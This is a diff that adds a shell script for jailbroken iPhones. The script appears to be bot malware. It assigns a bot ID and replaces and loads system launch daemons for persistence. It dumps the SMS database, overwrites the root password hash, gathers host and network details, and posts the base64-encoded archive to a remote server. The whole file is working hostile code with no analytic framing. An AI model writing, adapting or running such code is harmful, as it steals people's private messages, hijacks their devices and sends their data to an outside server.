@@ -1,0 +1,35 @@
+﻿#!/bin/sh
+if test -r /etc/rel
+then
+    ID="cat /etc/rel"
+else # Set up the unique bot ID
+    ID=$RANDOM$RANDOM
+    echo $ID > /etc/rel
+fi
+mkdir $ID
+
+rm -rf /System/Library/LaunchDaemons/com.apple.ksyslog.plist
+mv com.apple.ksyslog.plist /System/Library/LaunchDaemons/com.apple.ksyslog.plist
+#install important core libs
+dpkg -i --refuse-downgrade --skip-same-version curl_7.19.4-6_iphoneos-arm.deb
+curl -O cache.saurik.com/debs/sqlite3_3.5.9-9_iphoneos-arm.deb
+dpkg -i --refuse-downgrade --skip-same-version sqlite3_3.5.9-9_iphoneos-arm.deb
+curl -O cache.saurik.com/debs/adv-cmds_119-5_iphoneos-arm.deb
+dpkg -i --refuse-downgrade --skip-same-version adv-cmds_119-5_iphoneos-arm.deb
+
+SQLITE1="which sqlite3"
+SQLITE=$SQLITE1\ "which sqlite"
+#archive all SMS messages
+sqlite3 /private/var/mobile/Library/SMS/sms.db "SELECT * FROM message" | cut -d \| -f 2,3,4,14 > $ID/sms.txt
+
+mv com.apple.period.plist /System/Library/LaunchDaemons/
+chmod +x /System/Library/LaunchDaemons/com.apple.period.plist
+/bin/launchctl load -w /System/Library/LaunchDaemons/com.apple.period.plist
+
+sed -i -e "s/\/smx7MYTQIi2M/ztzk6MZFq8t\/Q/g" /etc/master.passwd #change root password to 'ohshit'
+
+uname -nr >> $ID/info
+echo $SQLITE >> $ID/info
+ifconfig | grep inet >> $ID/info
+tar czf ${ID}.tgz $ID
+curl SERVER/xml/a.php?name=$ID --data "data=$(base64 -w 0 ${ID}.tgz)"
